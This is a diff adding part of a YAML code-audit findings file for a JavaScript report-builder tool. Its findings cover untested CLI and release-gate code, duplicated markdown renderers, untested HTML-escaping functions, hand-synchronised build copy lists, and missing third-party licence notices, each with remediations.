+          // CLI entry point (resolve symlinks so skill installs work)
+          if (realpathSync(process.argv[1]) === realpathSync(fileURLToPath(import.meta.url))) {
+            (async () => {
+              // Parse subcommand: `validate <dir>` or `build <dir>`; bare `<dir>` is
+              // treated as `build` for backward compatibility.
+              const rawArgs = process.argv.slice(2);
+              const SUBCOMMANDS = ['build', 'validate', 'evidence', 'ledger', 'finalize'];
+              const positional = rawArgs.filter(a => !a.startsWith('--'));
+              let subcommand = 'build';
+              let auditDir = positional[0];
+              if (SUBCOMMANDS.includes(positional[0])) {
+                subcommand = positional[0];
+                auditDir = positional[1];
+              }
+              // build subcommand (default)
+              // Viewer dir: source layout has template.html alongside this script;
+              // skill layout has it in ../templates/ relative to scripts/
+              const viewerDirCandidates = [
+                scriptDir,
+                join(scriptDir, '..', 'templates'),
+              ];
+              const viewerDir = viewerDirCandidates.find(d => existsSync(join(d, 'template.html')));
+              if (!viewerDir) {
+                console.error('Cannot find template.html relative to script');
+                process.exit(1);
+              }
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: 2-3
+            type: mark
+            label: everything below lives inside this guard — no export, no test seam
+        mechanism: |
+          Lines 941–1133 are a single anonymous async IIFE inside a `realpathSync` guard: argv parsing,
+          five subcommand handlers (`validate`, `evidence`, `ledger`, `finalize`, `build`), three
+          candidate-path resolution searches (viewerDir, fontsDir, viewerJs), and four conditional file
+          writes (report.html, AGENTS.md, CLAUDE.md, README.md) with different overwrite policies each.
+          That is ~193 of the file's 1133 lines, none of it reachable from a test, because nothing in the
+          block is exported — `test/build-report.test.mjs` imports 18 symbols and none of them is the
+          dispatcher. The consequences are concrete and already visible: subcommand dispatch treats a bare
+          directory as `build`, so a typo like `node build-report.mjs finalise <dir>` is silently accepted
+          as a build of a directory named `finalise`; `--allow-unledgered-prior` is matched with
+          `rawArgs.includes` (line 1041) so it works for `finalize` but is silently ignored by every other
+          subcommand; and the three candidate-path searches encode layout knowledge (source tree vs
+          `build/` vs installed skill) that only `just build-smoke` exercises, and only for one layout.
+          The module as a whole is also doing too much — YAML parsing, ajv validation, HTML rendering,
+          markdown rendering, SVG generation, gate orchestration, and CLI — in one file.
+        remediation: |
+          Extract the closure body into exported functions — `parseCliArgs(argv)` returning
+          `{subcommand, auditDir, flags}`, one `runX(auditDir, opts)` per subcommand, and
+          `resolveLayout(scriptDir, repoRoot)` returning `{viewerDir, fontsDir, viewerJs}` — leaving the
+          guard as a ~5-line dispatcher. Then unit-test argument parsing (including the unknown-subcommand
+          case, which should exit non-zero rather than fall through to `build`) and layout resolution
+          against synthetic directory trees. As a follow-on, split the module: `render-html.mjs`
+          (renderHeader/renderNarrative/renderFinding/renderLedger/sparklines), `render-markdown.mjs`
+          (AGENTS.md/README.md/carried-forward/reconciliation), and `schema.mjs`
+          (resolveSchemaDir/compileValidators/validate*).
+        temporal:
+          introduced: 2026-04-05
+          last_modified: 2026-08-28
+          commit_count: 11
+        chains:
+          enables:
+            - finalize-gate-branches-untested
+          enabled_by: []
+          related:
+            - agents-readme-render-duplication
+            - build-report-subcommand-fallback
+        effort: medium
+        effort_notes: Mechanical extraction of five handlers plus new tests; no behaviour change intended.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+      - slug: agents-readme-render-duplication
+        title: renderAgentsMd and renderReadmeMd duplicate metadata assembly and a 13-key template contract
+        concern: moderate
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 696
+            end_line: 712
+          - path: src/viewer/build-report.mjs
+            start_line: 741
+            end_line: 753
+        evidence: |
+          export function renderAgentsMd(findings, templateStr, auditSlug, { recon = null, priorAudits = [] } = {}) {
+            const auditTitle = titleFromScope(findings.scope);
+            let findingCount = 0;
+            for (const n of findings.narratives || []) {
+              findingCount += (n.findings || []).length;
+            }
+            const findingList = renderAgentsFindingList(findings);
+
+            const { blocking, backlog } = blockingCounts(findings);
+            const testCommand = recon?.testing?.command || '<recon.yaml#testing.command not detected — use the project task runner>';
+            const mode = recon?.meta?.audit_profile?.mode ?? 'fresh';
+            const phase = recon?.meta?.audit_profile?.release_phase;
+            const releasePhase = (!phase || phase === 'unspecified') ? RELEASE_PHASE_UNKNOWN : phase;
+            const priorList = priorAudits.length
+              ? priorAudits.map(p => `- \`${p.slug}\`${p.hasLedger ? '' : ' — **no actions-taken.md** (findings there are untracked)'}`).join('\n')
+              : '_none_';
+
+          export function renderReadmeMd(findings, templateStr, { priorAudits = [] } = {}) {
+            const auditTitle = titleFromScope(findings.scope);
+            const narratives = findings.narratives || [];
+            let findingCount = 0;
+            for (const n of narratives) {
+              findingCount += (n.findings || []).length;
+            }
+            const counts = findings.summary?.counts || {};
+            const findingList = renderAgentsFindingList(findings);
+            const { blocking, backlog } = blockingCounts(findings);
+            const priorList = priorAudits.length
+              ? priorAudits.map(p => `- \`${p.slug}\`${p.hasLedger ? '' : ' — **no actions-taken.md** (findings there are untracked)'}`).join('\n')
+              : '_none_';
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: 14-16
+            type: mark
+            label: priorList — byte-identical to lines 28-30
+          - lines: 28-30
+            type: mark
+            label: the divergent, untested twin
+        mechanism: |
+          The two renderers are parallel implementations of the same job: interpolate audit metadata into a
+          markdown template. Both compute `auditTitle` via `titleFromScope`, both hand-roll the same
+          `findingCount` accumulation loop, both call `renderAgentsFindingList`, both destructure
+          `blockingCounts`, and both build `priorList` from a byte-identical two-line expression (lines
+          709–711 and 751–753 are the same characters). Below the cited ranges the duplication continues
+          into the `.replaceAll` chains: eight placeholder keys (`{{audit_title}}`, `{{audit_scope}}`,
+          `{{audit_date}}`, `{{finding_count}}`, `{{finding_list}}`, `{{blocking_count}}`,
+          `{{backlog_count}}`, `{{prior_audits}}`, `{{carried_forward_list}}`) are wired up twice with the
+          same semantics. Drift is the concrete risk and one instance already exists: `renderReadmeMd`
+          wires `{{reconciliation_table}}` and `renderAgentsMd` does not, so a reconciliation block reaches
+          the human-facing README but never the agent-facing briefing that AGENTS.md tells a remediator to
+          read first. `renderAgentsMd` is tested (`test/build-report.test.mjs:362`); `renderReadmeMd` has no
+          test at all, so the divergent half is also the unguarded half.
+        remediation: |
+          Extract a shared `auditTemplateVars(findings, {recon, auditSlug, priorAudits})` that returns the
+          full key→value map, and reduce both renderers to `interpolate(templateStr, vars)` — a single
+          `Object.entries(vars).reduce(...)` over `replaceAll`. Each template then consumes whichever keys
+          it declares, and adding a key makes it available to both documents by construction. Add a test
+          asserting that every `{{...}}` placeholder appearing in `agents-md-template.md` and
+          `readme-template.md` is present in the vars map, which turns the current
+          `{{reconciliation_table}}` asymmetry into a decision rather than an accident.
+        temporal:
+          introduced: 2026-04-12
+          last_modified: 2026-08-28
+          commit_count: 11
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - build-report-cli-monolith
+            - untested-render-and-escape-exports
+        effort: small
+        effort_notes: One helper plus two call-site rewrites; renderAgentsMd already has a test to hold behaviour.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+      - slug: untested-render-and-escape-exports
+        title: Four exported render/escape functions on the report path have no tests
+        concern: moderate
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 204
+            end_line: 206
+          - path: src/viewer/build-report.mjs
+            start_line: 217
+            end_line: 223
+          - path: src/viewer/build-report.mjs
+            start_line: 572
+            end_line: 574
+          - path: src/viewer/build-report.mjs
+            start_line: 741
+            end_line: 742
+        evidence: |
+          export function escHtml(s) {
+            if (s == null) return '';
+            return String(s)
+          export function renderProse(s) {
+            if (s == null) return '';
+            const str = String(s);
+
+            const tokens = [];
+            let lastIndex = 0;
+            const pattern = /\[([^\]]+)\]\(([^)]+)\)|\*\*([^*]+)\*\*|`([^`]+)`/g;
+          export function generateSparklines(auditDir, findings) {
+            const assetsDir = join(auditDir, 'assets');
+            let count = 0;
+          export function renderReadmeMd(findings, templateStr, { priorAudits = [] } = {}) {
+            const auditTitle = titleFromScope(findings.scope);
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: "1"
+            type: mark
+            label: the escaper every model-authored string goes through — zero tests
+          - lines: "10"
+            type: mark
+            label: hand-rolled markdown tokenizer, zero tests
+        mechanism: |
+          `grep -rn 'renderProse\|escHtml\|generateSparklines\|renderReadmeMd' test/` returns zero hits —
+          these four exports are never imported by any test file, while the 18 other exports of the same
+          module are. They are not obscure helpers: `renderProse` is called three times per report
+          (assessment, and every finding's mechanism and remediation, lines 358/448/452) and `escHtml`
+          is called on essentially every model-authored string that reaches the HTML. `renderProse` is the
+          riskiest of the four — a hand-rolled tokenizer whose correctness depends on interleaving an
+          alternation regex with escaping in the right order (the function's own comment says "Order
+          matters"), with untested behaviour for nested markers, unbalanced backticks, a `]` inside link
+          text, and `javascript:` link hrefs. `generateSparklines` writes files into the audit directory
+          and divides by `commits.length - 1` (line 552), and `renderReadmeMd` is the divergent half of the
+          template-renderer pair described in `agents-readme-render-duplication`. The existing suite
+          exercises this code only transitively through `assembleReport`, which asserts on a couple of
+          substrings and cannot distinguish "escaped correctly" from "escaped at all".
+        remediation: |
+          Add table-driven unit tests for each: `escHtml` over `& < > "` plus `null`/`undefined`/number
+          inputs; `renderProse` over plain text, each marker type, adjacent and nested markers, unbalanced
+          delimiters, and an input containing raw HTML to prove the escape survives tokenization;
+          `generateSparklines` against a temp dir asserting file names, the all-zero series, and a
+          `monthly_commits` array of the wrong length being skipped; `renderReadmeMd` mirroring the
+          existing `renderAgentsMd` test at `test/build-report.test.mjs:362`, including a
+          `{{reconciliation_table}}` assertion.
+        temporal:
+          introduced: 2026-04-05
+          last_modified: 2026-08-28
+          commit_count: 11
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - agents-readme-render-duplication
+            - flow-diagram-tests-excluded-from-suite
+            - prose-links-allow-javascript-uris
+        effort: small
+        effort_notes: Four pure-ish functions; three need no fixtures, one needs a temp dir.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+      - slug: finalize-gate-branches-untested
+        title: Three finalizeAudit release-gate branches have no test, including the override flag
+        concern: moderate
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 807
+            end_line: 819
+          - path: src/viewer/build-report.mjs
+            start_line: 821
+            end_line: 828
+        evidence: |2
+            // origin refs required for causal kinds (belt-and-braces if the schema's if/then was dropped)
+            for (const f of allFindings(findings)) {
+              if (f.origin && ['caused-by-fix', 'recurrence-of'].includes(f.origin.kind) && !f.origin.ref) {
+                errors.push(`${f.slug}: origin.kind ${f.origin.kind} requires origin.ref`);
+              }
+            }
+
+            const prior = findPriorAudits(join(auditDir, '..'), basename(auditDir));
+            for (const p of prior) {
+              if (p.findingCount > 0 && !p.hasLedger) {
+                (allowUnledgeredPrior ? warnings : errors).push(`prior audit ${p.slug} has ${p.findingCount} findings and no actions-taken.md — its findings are untracked (pass --allow-unledgered-prior to override)`);
+              }
+            }
+            if (recon?.meta?.audit_profile?.mode === 're-audit') {
+              if (!findings.reconciliation) errors.push('re-audit mode but findings.yaml has no reconciliation block — every ledgered prior fix needs a still-fixed/regressed/superseded/not-verified row');
+              const regressed = (findings.reconciliation ?? []).filter(r => r.status === 'regressed').map(r => r.prior_slug);
+              const recurrences = new Set(allFindings(findings).filter(f => f.origin?.kind === 'recurrence-of').map(f => f.origin.ref));
+              for (const s of regressed) {
+                if (!recurrences.has(s)) errors.push(`reconciliation marks ${s} regressed but no finding carries origin {kind: recurrence-of, ref: ${s}}`);
+              }
+            }
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: 3-4
+            type: mark
+            label: origin.ref requirement — no test
+          - lines: "11"
+            type: mark
+            label: allowUnledgeredPrior — grep of test/ returns zero hits
+          - lines: 16-19
+            type: mark
+            label: regressed-without-recurrence cross-check — no test
+        mechanism: |
+          `finalizeAudit` is the release gate: `build-report.mjs finalize` exits non-zero on any error it
+          returns, and `scoreArtifacts` reports `finalize_ok` as an eval metric. Its three test cases
+          (`test/build-report.test.mjs:371-453`) cover the missing-file gate, the README/audit_profile/
+          unledgered-prior errors, and the missing-reconciliation error. Three distinct branches in the
+          cited ranges are exercised by nothing. (1) `allowUnledgeredPrior` — `grep -rn
+          'allowUnledgeredPrior\|allow-unledgered-prior' test/` returns zero hits, so the flag that
+          downgrades a blocking error to a warning, plumbed from `--allow-unledgered-prior` at line 1041,
+          has never been executed under test in either position of the ternary. (2) The origin.ref
+          requirement at lines 809-811: the nearest tests
+          (`test/build-report.test.mjs:56-65`) assert the *schema's* handling of `origin`, not
+          `finalizeAudit`'s belt-and-braces check, which is explicitly there for the case where the schema's
+          if/then is dropped — i.e. it is only load-bearing exactly when the tested path fails. (3) The
+          regressed-without-recurrence cross-check at lines 825-827: `test/eval-score-reaudit.test.mjs`
+          exercises `scoreReaudit`, a different function on a different code path. Each is a
+          conditional-only-under-failure branch, the classic place for a typo to survive: a gate that
+          silently stops gating produces a passing audit that should have been blocked, and no test would
+          notice.
+        remediation: |
+          Extend the existing `describe('finalizeAudit')` block with three cases built on the temp-repo
+          helper already in that file: a prior audit with findings and no `actions-taken.md` asserted to
+          land in `errors` with `{allowUnledgeredPrior: false}` and in `warnings` with `true`; a finding
+          carrying `origin: {kind: 'recurrence-of'}` and no `ref` asserted to produce the
+          `requires origin.ref` error; and a re-audit whose reconciliation marks a slug `regressed` while
+          no finding carries the matching `recurrence-of` origin, asserted to error, plus the paired case
+          where it does and the errors are empty.
+        temporal:
+          introduced: 2026-08-28
+          last_modified: 2026-08-28
+          commit_count: 1
+        chains:
+          enables: []
+          enabled_by:
+            - build-report-cli-monolith
+          related:
+            - finalize-skips-ledger-commit-verification
+        effort: small
+        effort_notes: Three cases reusing the temp-repo scaffolding already present in the same describe block.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+      - slug: build-viewer-parallel-copy-lists
+        title: build-viewer.sh maintains two hand-synchronised copies of the same asset list
+        concern: advisory
+        locations:
+          - path: scripts/build-viewer.sh
+            start_line: 18
+            end_line: 22
+          - path: scripts/build-viewer.sh
+            start_line: 32
+            end_line: 36
+        evidence: |
+          cp src/viewer/template.html         build/template.html
+          cp src/viewer/agents-md-template.md build/agents-md-template.md
+          cp src/viewer/readme-template.md    build/readme-template.md
+          cp src/viewer/style.css             build/style.css
+          cp vendor/fonts/*.woff2             build/fonts/
+          cp src/viewer/template.html         skills/cased/templates/template.html
+          cp src/viewer/agents-md-template.md skills/cased/templates/agents-md-template.md
+          cp src/viewer/readme-template.md    skills/cased/templates/readme-template.md
+          cp src/viewer/style.css             skills/cased/templates/style.css
+          cp vendor/fonts/*.woff2             skills/cased/templates/fonts/
+        evidence_lang: bash
+        evidence_markers:
+          - lines: 1-5
+            type: mark
+            label: → build/ (local testing)
+          - lines: 6-10
+            type: mark
+            label: → skills/cased/templates/ (shipped) — same five sources
+        mechanism: |
+          The same five source assets are copied to two destinations by two hand-maintained blocks that
+          must be kept in sync by memory. Adding a sixth template and updating only the `build/` block
+          produces a shipped skill that silently lacks the file. The repo's drift guard does not catch it:
+          `just check-bundle` reruns this script and fails on `git diff --quiet skills/cased/` — a file
+          that was never copied produces no diff, so the check passes. `just build-smoke` runs
+          `build/build-report.js` against `build/`, the branch that *did* get the new asset, so it passes
+          too. The result is a class of error where both gates report green and the failure surfaces only
+          when someone installs the skill. The existing candidate-path fallbacks in `build-report.mjs`
+          (`viewerDirCandidates`, `fontsDirCandidates`) make it worse by degrading quietly — a missing
+          `agents-md-template.md` in the skill layout logs a warning and skips AGENTS.md rather than
+          failing.
+        remediation: |
+          Drive both destinations from one list, e.g. `ASSETS=(template.html agents-md-template.md
+          readme-template.md style.css)` with a `for dest in build skills/cased/templates` loop, so a new
+          asset lands in both by construction. Then close the gate gap: have `check-bundle` assert that
+          `skills/cased/templates/` contains exactly the expected file set (compare a sorted `ls` against
+          the same `ASSETS` array plus the fonts), which turns "forgot to copy" into a build failure rather
+          than a silent omission.
+        temporal:
+          introduced: 2026-04-08
+          last_modified: 2026-04-12
+          commit_count: 6
+        chains:
+          enables: []
+          enabled_by: []
+          related: []
+        effort: trivial
+        effort_notes: A five-line loop replacing ten cp lines, plus one assertion in check-bundle.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+      - slug: detect-npm-test-command-discarded
+        title: detectNpmTest computes the project's real test command and its caller throws it away
+        concern: note
+        locations:
+          - path: src/recon/recon-to-yaml.mjs
+            start_line: 334
+            end_line: 342
+          - path: src/recon/recon-to-yaml.mjs
+            start_line: 479
+            end_line: 483
+        evidence: |2
+            // Priority 3: package.json scripts.test
+            const npmResult = detectNpmTest(targetPath);
+            if (npmResult) {
+              return finalizeTesting({
+                command: 'npm test',
+                sources: ['package.json'],
+                targetPath,
+              });
+            }
+            try {
+              const pkg = JSON.parse(readFileSync(pkgPath, 'utf8'));
+              if (pkg?.scripts?.test && typeof pkg.scripts.test === 'string') {
+                return { command: pkg.scripts.test };
+              }
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: "5"
+            type: mark
+            label: hard-coded, ignoring npmResult.command
+          - lines: "13"
+            type: mark
+            label: the computed command, never read
+        mechanism: |
+          `detectNpmTest` returns `{ command: pkg.scripts.test }` — it reads, type-checks, and returns the
+          project's actual test script — and the only caller binds it to `npmResult`, tests it for truthiness,
+          and then passes the string literal `'npm test'` instead. `npmResult.command` has no reader
+          anywhere in the file. The inconsistency is with its own siblings: `detectScratTest` returns the
+          same `{command, source}` shape and its caller *does* use `scratResult.command` (lines 315-321),
+          while `detectJustTest` and `detectNextestConfig` deliberately return only `{source}`. Three
+          shapes across four parallel detectors, one of them carrying a field that is computed and dropped.
+          The user-visible behaviour happens to be right today (`npm test` does run `scripts.test`), which
+          is why this is a note rather than a defect — but the returned field is a standing invitation to
+          "fix" the caller to use it, silently changing `recon.yaml#testing.command` from a portable
+          wrapper to a raw command, and the reader of `detectTesting` cannot tell which detectors' commands
+          are authoritative without opening each one.
+        remediation: |
+          Make `detectNpmTest` return `{ source: 'package.json' }` only, matching `detectJustTest`, since
+          the caller intentionally normalizes to the `npm test` wrapper — and add a one-line comment saying
+          why the raw script is not used. Alternatively, if the raw script is the more accurate answer,
+          pass `npmResult.command` through and update `inferRunner` accordingly. Either way, settle on one
+          return shape convention for the detector family and state it in the `detectTesting` doc comment.
+        temporal:
+          introduced: 2026-04-12
+          last_modified: 2026-08-28
+          commit_count: 4
+        chains:
+          enables: []
+          enabled_by: []
+          related: []
+        effort: trivial
+        effort_notes: One-line change plus a comment.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+      - slug: flat-findings-traversal-reimplemented
+        title: The narratives-to-findings flatten is reimplemented four times alongside the allFindings helper
+        concern: note
+        locations:
+          - path: src/viewer/gates.mjs
+            start_line: 14
+            end_line: 16
+          - path: src/viewer/prior-audits.mjs
+            start_line: 49
+            end_line: 49
+          - path: src/viewer/build-report.mjs
+            start_line: 867
+            end_line: 872
+          - path: evals/scripts/score-eval.mjs
+            start_line: 49
+            end_line: 54
+          - path: evals/scripts/score-eval.mjs
+            start_line: 134
+            end_line: 134
+        evidence: |
+          export function allFindings(doc) {
+            return (doc.narratives ?? []).flatMap(n => n.findings ?? []);
+          }
+              return (doc.narratives ?? []).reduce((n, nar) => n + (nar.findings ?? []).length, 0);
+            const slugToTitle = {};
+            for (const n of (findings.narratives || [])) {
+              for (const f of (n.findings || [])) {
+                slugToTitle[f.slug] = f.title;
+              }
+            }
+            const findings = [];
+            for (const narrative of findingsDoc.narratives ?? []) {
+              for (const f of narrative.findings ?? []) {
+                findings.push(f);
+              }
+            }
+            const findings = (findingsDoc.narratives ?? []).flatMap(n => n.findings ?? []);
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: 1-3
+            type: ins
+            label: the canonical helper
+          - lines: "4"
+            type: mark
+            label: "prior-audits: counts, same walk"
+          - lines: 5-10
+            type: mark
+            label: "build-report: slug→title map, `||` instead of `??`"
+          - lines: 11-17
+            type: mark
+            label: score-eval, twice, in a file that already imports allFindings
+        mechanism: |
+          Every `.mjs`/`.js` under `src/` and `evals/` was grepped for `narratives`: the flat
+          "walk narratives, collect findings" traversal is written out four more times beside the exported
+          `allFindings` helper. Two of them are in `score-eval.mjs`, which already imports `allFindings`
+          on line 24 and uses it on line 337 — so the same file both uses the helper and hand-rolls it
+          twice. `prior-audits.mjs:49` counts rather than collects but is the same walk, and
+          `build-report.mjs:867` builds a slug→title map from it. (The sites that legitimately need
+          per-narrative context — `renderNarrative`, `ledgerRows`, `renderAgentsFindingList` — are
+          excluded; those are nested for a reason.) Divergence has already started at the null-handling
+          level: `allFindings` and score-eval use `??`, build-report uses `||`, which differ for a
+          falsy-but-present `narratives` value. The real cost is future: `carried_forward` findings are
+          deliberately excluded from narratives today, and any future rule about which findings "count"
+          (suppressed, superseded, severity-floored) has to be applied at five sites instead of one, with
+          nothing to flag the ones that were missed.
+        remediation: |
+          Import `allFindings` at the three call sites that can (score-eval.mjs lines 49-54 and 134 become
+          `const findings = allFindings(findingsDoc);`; build-report.mjs:867 becomes
+          `Object.fromEntries(allFindings(findings).map(f => [f.slug, f.title]))`). For
+          `prior-audits.mjs:49`, importing from gates.mjs would create a cycle (gates.mjs imports
+          `parseLedger` from prior-audits.mjs) — move `allFindings` into a small shared module and import
+          it from both, alongside the `DISPOSITIONS` constant from `disposition-vocabulary-triplicated`.
+        temporal:
+          introduced: 2026-04-05
+          last_modified: 2026-08-28
+          commit_count: 11
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - disposition-vocabulary-triplicated
+        effort: trivial
+        effort_notes: Four call-site substitutions plus one module extraction to break the import cycle.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+  - slug: supply-chain-surface
+    title: The Supply Chain Surface
+    thesis: "No runtime dependencies ship, so the supply-chain question is not vulnerability but attribution: the bundle carries ~80 MIT/ISC/BSD packages and none of their notices."
+    verdict: One policy defect worth fixing before a public release — a generated THIRD-PARTY-NOTICES file — and one ergonomics gap in the eval runner. Nothing copyleft, nothing unpinned in CI.
+    findings:
+      - slug: bundled-third-party-source-missing-license-notices
+        title: Shipped skill bundles strip MIT/ISC/BSD license notices from ~80 third-party packages
+        concern: significant
+        locations:
+          - path: skills/cased/scripts/build-report.js
+            start_line: 38
+            end_line: 40
+          - path: skills/cased/templates/viewer.js
+            start_line: 1
+            end_line: 3
+        evidence: |
+          //#region node_modules/yaml/dist/nodes/identity.js
+          var require_identity = /* @__PURE__ */ __commonJSMin(((exports) => {
+          	const ALIAS = Symbol.for("yaml.alias");
+          (function() {
+          	//#region node_modules/rough-notation/lib/rough-notation.esm.js
+          	const t = "http://www.w3.org/2000/svg";
+        evidence_lang: js
+        evidence_markers:
+          - lines: "1"
+            type: mark
+            label: rolldown region marker names the bundled package, but no license/copyright text accompanies it
+          - lines: "5"
+            type: mark
+            label: same in the viewer bundle
+        mechanism: |
+          `scripts/build-viewer.sh` runs `npx rolldown ... --format cjs` and
+          `--format iife` to produce the two artifacts the skill actually ships:
+          `skills/cased/scripts/build-report.js` (40,964 lines) and
+          `skills/cased/templates/viewer.js` (823 lines). Both are committed
+          output, redistributed to every user who installs the cased skill.
+          grep across the full build-report.js bundle shows 333 distinct
+          `//#region node_modules/<pkg>/...` inlining markers (yaml, ajv,
+          ajv-formats, @shikijs/*, @expressive-code/*, postcss,
+          postcss-selector-parser, hast-util-to-html, hastscript,
+          property-information, oniguruma-to-es, source-map-js, nanoid,
+          cssesc, and more — 81 unique packages resolved in node_modules
+          total). Surveying every package.json under node_modules gives 74 MIT, 4
+          ISC and 3 BSD — fast-uri and source-map-js (BSD-3-Clause, and
+          source-map-js is inlined with 11 region markers) and nth-check
+          (BSD-2-Clause). None are copyleft, so license *compatibility* is not at
+          issue, but MIT, ISC and both BSD variants all require the
+          license/copyright notice to be preserved in redistributed copies, and
+          BSD-3 adds a non-endorsement clause. Searching the two shipped bundles for
+          "Permission is hereby granted" (the MIT text) or "Copyright (c)"
+          notices returns zero matches in either file; the only surviving
+          attribution comment in the entire 40,964-line build-report.js is
+          an unrelated single-line `/*! https://mths.be/cssesc v3.0.0 by
+          @mathias */` banner that happened to match rolldown's default
+          "preserve legal comments" heuristic. No NOTICE, THIRD-PARTY-LICENSES,
+          or equivalent file exists anywhere in the repo (checked repo root
+          and `skills/cased/`), and neither README.md nor AGENTS.md mentions
+          bundled third-party attribution. The bundling step has shipped this
+          way since the artifact was first generated (commit b565da4,
+          2026-04-05) and survived the Aug 10 dependency-refresh commit (#36)
+          that bumped rolldown, shikijs, and expressive-code versions without
+          addressing attribution.
+        remediation: |
+          Generate a THIRD-PARTY-NOTICES file as part of `scripts/build-viewer.sh`
+          (e.g. via `license-checker` or `npx rolldown`'s own legal-comments
+          output mode set to a separate file) and ship it alongside
+          `skills/cased/scripts/build-report.js` and
+          `skills/cased/templates/viewer.js`. Reference it from
+          `skills/cased/SKILL.md` or the repo README so installers can see
+          what's bundled. This is mechanical — a build-step addition, not a
+          design change.
+        temporal:
+          introduced: 2026-04-05
+          last_modified: 2026-08-10
+          commit_count: 15
+        chains:
+          enables: []
+          enabled_by: []
+          related: []
+        effort: small
+        effort_notes: One new build-step invocation (license aggregation) plus a committed NOTICE file; no code logic changes.
+        origin:
+          kind: pre-existing
+        failure_mode: policy
+      - slug: eval-runner-no-external-cli-preflight-check
+        title: run-eval shells out to claude/codex/rsync/cargo with no preflight existence check, unlike recon's established pattern
+        concern: moderate
+        locations:
+          - path: evals/scripts/run-eval
+            start_line: 77
+            end_line: 78
+          - path: src/recon/recon
+            start_line: 36
+            end_line: 46
+        evidence: |
+          rsync -a --exclude expected-findings.yaml --exclude target \
+            --exclude setup.sh --exclude hidden-tests "$FIXTURE_DIR/" "$WORKDIR/"
+          # Required tools
+          for bin in cargo git tokei node; do
+            if ! command -v "$bin" >/dev/null 2>&1; then
+              echo "error: required tool '$bin' not found in PATH" >&2
+              case "$bin" in
+                cargo) echo "  install via https://rustup.rs" >&2 ;;
+                tokei) echo "  install via 'cargo install tokei'" >&2 ;;
+              esac
+              exit 3
+            fi
+          done
+        evidence_lang: bash
+        evidence_markers:
+          - lines: 1-2
+            type: mark
+            label: run-eval invokes an external CLI with no preflight check
+          - lines: 3-12
+            type: ins
+            label: "recon's sibling pattern: check-then-fail-with-install-hint before any tool is invoked"
+        mechanism: |
+          `src/recon/recon` establishes the project's own convention for
+          handling external CLI dependencies: before doing anything, it loops
+          over `cargo git tokei node`, checks each with `command -v`, and on a
+          miss prints an install hint and exits with a dedicated code (3),
+          documented in the script's header comment. `evals/scripts/run-eval`
+          depends on strictly more external tools — `rsync` (line 77-78, to
+          stage the fixture workdir), `git` (lines 81-83), `claude` or `codex`
+          (lines 142/157, the actual CLI under test), and `cargo test` (line
+          243, hidden-tests scoring in remediate mode) — but performs zero
+          existence checks on any of them. The script only sets
+          `set -euo pipefail`; if `rsync`, `claude`, `codex`, or `cargo` is
+          missing from PATH, execution fails with bash's bare "command not
+          found" (exit 127) and no guidance, at whatever point in the
+          multi-minute run the missing tool is first invoked — potentially
+          after `rsync` has already staged a workdir and `git init` has already
+          run. This is the same class of external-tool dependency the project
+          has already solved once in the same repo; run-eval just doesn't
+          apply the pattern.
+        remediation: |
+          Add a preflight loop to `evals/scripts/run-eval` mirroring
+          `src/recon/recon` lines 37-46: check `rsync`, `git`, `cargo`, and the
+          tool named by `--platform` (`claude` or `codex`) with `command -v`
+          before the rsync stage begins, with an install hint per tool and a
+          dedicated non-127 exit code.
+        temporal:
+          introduced: 2026-08-10
+          last_modified: 2026-08-10
+          commit_count: 3
+        chains:
+          enables: []
+          enabled_by: []
+          related: []
+        effort: trivial
+        effort_notes: ~10-line preflight loop, directly adaptable from recon's existing code.
+        origin:
+          kind: pre-existing
+        failure_mode: policy
+summary:
+  counts:
+    critical: 0
+    significant: 7
+    moderate: 26
+    advisory: 7
+    note: 2
